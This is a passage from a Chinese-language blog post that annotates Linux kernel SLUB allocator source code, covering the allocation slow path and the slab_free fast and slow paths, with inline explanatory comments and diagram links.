class="comment">//该kmem_cache_cpu没有正在使用的slab,跳转到new_slab</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">     !node_isset(node, slab_nodes)))</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">}</span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!node_match(slab, node))) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment"> * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!node_isset(node, slab_nodes)) {</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By rights, we should be searching for a slab page that was</span></span><br><span class="line"><span class="comment"> * PFMEMALLOC but right now, we are losing the pfmemalloc</span></span><br><span class="line"><span class="comment"> * information when the page leaves the per-cpu allocator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must check again c-&gt;slab in case we got preempted and it changed */</span></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//kmem_cache_cpu中freelist为空,尝试从kmem_cache_cpu-&gt;slab中获取freelist</span></span><br><span class="line">freelist = get_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="comment">//若还是未取到,说明当前正在使用的slab是满的,尝试获取新的slab.</span></span><br><span class="line"><span class="keyword">if</span> (!freelist) {</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, DEACTIVATE_BYPASS);</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 装载freelist链表,更新kmem_cache-&gt;freelist为空闲对象</span></span><br><span class="line"><span class="comment">* 链表中第二个对象,返回当前空闲对象中第一个对象(因为本次</span></span><br><span class="line"><span class="comment">* __alloc_slab会直接分配一个对象).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">load_freelist:</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment"> * slab is pointing to the slab from which the objects are obtained.</span></span><br><span class="line"><span class="comment"> * That slab must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">VM_BUG_ON(!c-&gt;slab-&gt;frozen);</span><br><span class="line">c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 将kmem_cache_cpu-&gt;slab-&gt;freelist合并连接到</span></span><br><span class="line"><span class="comment">* kmem_cache_cpu-&gt;freelist之后,解冻并根据合并后</span></span><br><span class="line"><span class="comment">* slab情况放入对应的kmem_cache_node的partial/full</span></span><br><span class="line"><span class="comment">* 链表中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">deactivate_slab:</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (slab != c-&gt;slab) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">deactivate_slab(s, slab, freelist);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 尝试从kmem_cache_cpu-&gt;partial中获取slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slub_percpu_partial(c)) {</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slub_percpu_partial(c))) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="comment">/* we were preempted and partial list got empty */</span></span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">slab = c-&gt;slab = slub_percpu_partial(c);</span><br><span class="line">slub_set_percpu_partial(c, slab); <span class="comment">//更新partial链表</span></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 尝试从kmem_cache_node-&gt;partial中获取slab.</span></span><br><span class="line"><span class="comment">* 若失败则调用new_slab向budy system申请新的slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">new_objects:</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">freelist = get_partial(s, node, &amp;pc);</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> check_new_slab;</span><br><span class="line"></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) {</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLAB);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) {</span><br><span class="line">freelist = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!freelist))</span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * No other reference to the slab yet so we can</span></span><br><span class="line"><span class="comment"> * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">slab-&gt;inuse = slab-&gt;objects;</span><br><span class="line">slab-&gt;frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新kmem_cache_node-&gt;nr_slabs,total_objects</span></span><br><span class="line">inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);</span><br><span class="line"></span><br><span class="line">check_new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For debug caches here we had to go through</span></span><br><span class="line"><span class="comment"> * alloc_single_from_partial() so just store the tracking info</span></span><br><span class="line"><span class="comment"> * and return the object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For !pfmemalloc_match() case we don't load freelist so that</span></span><br><span class="line"><span class="comment"> * we don't make further mismatched allocations easier.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">deactivate_slab(s, slab, get_freepointer(s, freelist));</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 再次尝试装载slab,如果kmem_cache_cpu上已经有</span></span><br><span class="line"><span class="comment">* slab了(并发问题),进行deactivate直到成功装载</span></span><br><span class="line"><span class="comment">* 新的slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">retry_load_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) {</span><br><span class="line"><span class="type">void</span> *flush_freelist = c-&gt;freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">flush_slab</span> =</span> c-&gt;slab;</span><br><span class="line"></span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">deactivate_slab(s, flush_slab, flush_freelist);</span><br><span class="line"></span><br><span class="line">stat(s, CPUSLAB_FLUSH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> retry_load_slab;</span><br><span class="line">}</span><br><span class="line">c-&gt;slab = slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="slab-free"><a href="#slab-free" class="headerlink" title="slab_free"></a>slab_free</h3><p>slab中释放内存最终都会调用到slab_free函数.<br>slab_free处理中的判断分支有点复杂,画图不好表示,还是看下面的分析吧.<br>简单概括一下:</p><ol><li>将对象加入到对应slab的freelist中.</li><li>加入到kmem_cache_cpu-&gt;partial 或 回退到kmem_cache_node处理,更新kmem_cache_node的full和partial链表.</li></ol><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401292112574.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401292112387.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __fastpath_inline <span class="type">void</span> <span class="title function_">slab_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab,</span></span><br><span class="line"><span class="params">      <span class="type">void</span> *head, <span class="type">void</span> *tail, <span class="type">void</span> **p, <span class="type">int</span> cnt,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line">{</span><br><span class="line">memcg_slab_free_hook(s, slab, p, cnt);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span></span><br><span class="line"><span class="comment"> * to remove objects, whose reuse must be delayed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))</span><br><span class="line">do_slab_free(s, slab, head, tail, cnt, addr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>与分配相同,释放同样有FASTPATH和SLOWPATH.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 仅当我们正在释放到kmem_cache_cpu-&gt;slab时才可能使用FASTPATH.</span></span><br><span class="line"><span class="comment"> * 这通常是当我们才刚刚分配这个对象时.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果不能通过FASTPATH,则回退到__slab_free来进行各种特殊处理</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 通过指示头尾指针以及对象数量,可以批量释放一个空闲链表中的多个</span></span><br><span class="line"><span class="comment"> * 对象(指向同一slab). 通过设置尾指针来指示批量释放</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">do_slab_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> slab *slab, <span class="type">void</span> *head, <span class="type">void</span> *tail,</span></span><br><span class="line"><span class="params"><span class="type">int</span> cnt, <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *tail_obj = tail ? : head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;</span><br><span class="line"><span class="type">void</span> **freelist;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the currently cpus per cpu slab.</span></span><br><span class="line"><span class="comment"> * The cpu may change afterward. However that does not matter since</span></span><br><span class="line"><span class="comment"> * data is retrieved via this pointer. If we are on the same cpu</span></span><br><span class="line"><span class="comment"> * during the cmpxchg then the free will succeed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same with comment on barrier() in slab_alloc_node() */</span></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否释放到当前cpu的slab,若不是进入SLOWPATH</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) {</span><br><span class="line">__slab_free(s, slab, head, tail_obj, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="comment">//FASTPATH,直接将原freelist连到tail之后</span></span><br><span class="line">    <span class="comment">//设置新的freelist为head.下面对应有锁无锁两种处理.</span></span><br><span class="line"><span class="keyword">if</span> (USE_LOCKLESS_FAST_PATH()) {</span><br><span class="line">freelist = READ_ONCE(c-&gt;freelist);</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, freelist, head, tid))) {</span><br><span class="line">note_cmpxchg_failure(<span class="string">"slab_free"</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">/* Update the free list under the local lock */</span></span><br><span class="line">local_lock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) {</span><br><span class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line">tid = c-&gt;tid;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line">c-&gt;freelist = head;</span><br><span class="line">c-&gt;tid = next_tid(tid);</span><br><span class="line"></span><br><span class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">}</span><br><span class="line">stat(s, FREE_FASTPATH);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLOW PATH处理.这条路径仍然经常被调用,因为</span></span><br><span class="line"><span class="comment"> * 在大多数处理中对象比cpu slab有更长的生命周期</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所以我们仍然尽力减少缓存行的使用.只是持有slab lock并释放对象.</span></span><br><span class="line"><span class="comment"> * 如果这里没有额外的partial slab处理需求,我们可以立即返回.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __slab_free(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab,</span><br><span class="line"><span class="type">void</span> *head, <span class="type">void</span> *tail, <span class="type">int</span> cnt,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> addr)</span><br><span class="line"></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *prior;</span><br><span class="line"><span class="type">int</span> was_frozen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">stat(s, FREE_SLOWPATH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kfence_free(head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) {</span><br><span class="line">free_to_partial_list(s, slab, head, tail, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line"><span class="keyword">if</span> (unlikely(n)) {</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">n = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">prior = slab-&gt;freelist;</span><br><span class="line">counters = slab-&gt;counters;</span><br><span class="line">set_freepointer(s, tail, prior);</span><br><span class="line">new.counters = counters;</span><br><span class="line">was_frozen = new.frozen;</span><br><span class="line">new.inuse -= cnt;</span><br><span class="line"><span class="keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) {</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab was on no list before and will be</span></span><br><span class="line"><span class="comment"> * partially empty</span></span><br><span class="line"><span class="comment"> * We can defer the list move and instead</span></span><br><span class="line"><span class="comment"> * freeze it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//原slab为full list且未冻结并且</span></span><br><span class="line"><span class="comment">//将要成为部分空闲</span></span><br><span class="line"><span class="comment">//我们可以推迟链表移动而是将其冻结</span></span><br><span class="line">new.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">} <span class="keyword">else</span> { <span class="comment">/* Needs to be taken off a list */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 需要回退到kmem_cache_node进行处理.条件为:</span></span><br><span class="line"><span class="comment">* 1. 释放前slab未被冻结.(!was_frozen)</span></span><br><span class="line"><span class="comment">* 2. (释放后slab完全空闲)||(释放前该slab已满&amp;&amp;CONFIG_SLUB_CPU_PARTIAL)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">n = get_node(s, slab_nid(slab));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Speculatively acquire the list_lock.</span></span><br><span class="line"><span class="comment"> * If the cmpxchg does not succeed then we may</span></span><br><span class="line"><span class="comment"> * drop the list_lock without any processing.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise the list_lock will synchronize with</span></span><br><span class="line"><span class="comment"> * other processors updating the list of slabs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">} <span class="keyword">while</span> (!slab_update_freelist(s, slab,</span><br><span class="line">prior, counters,</span><br><span class="line">head, new.counters,</span><br><span class="line"><span class="string">"__slab_free"</span>));</span><br><span class="line"><span class="comment">//至此freelist更新完毕,由于slab的状态可能发生改变,接下来</span></span><br><span class="line"><span class="comment">//是对slab的移动.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(!n)) {</span><br><span class="line"><span class="comment">//不需要回退到kmem_cache_node进行处理</span></span><br><span class="line"><span class="keyword">if</span> (likely(was_frozen)) {</span><br><span class="line"><span class="comment">//释放前slab为冻结状态,不做处理</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The list lock was not taken therefore no list</span></span><br><span class="line"><span class="comment"> * activity can be necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">stat(s, FREE_FROZEN);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (new.frozen) {</span><br><span class="line"><span class="comment">//释放后slab已被冻结,加入到当前kmem_cache_cpu-&gt;partial</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we just froze the slab then put it onto the</span></span><br><span class="line"><span class="comment"> * per cpu partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">put_cpu_partial(s, slab, <span class="number">1</span>);</span><br><span class="line">stat(s, CPU_PARTIAL_FREE);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line"><span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment"> * then add it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) {</span><br><span class="line"><span class="comment">//如果原slab是满的,且释放后不是完全空闲,则从full转移到partial</span></span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">}</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, 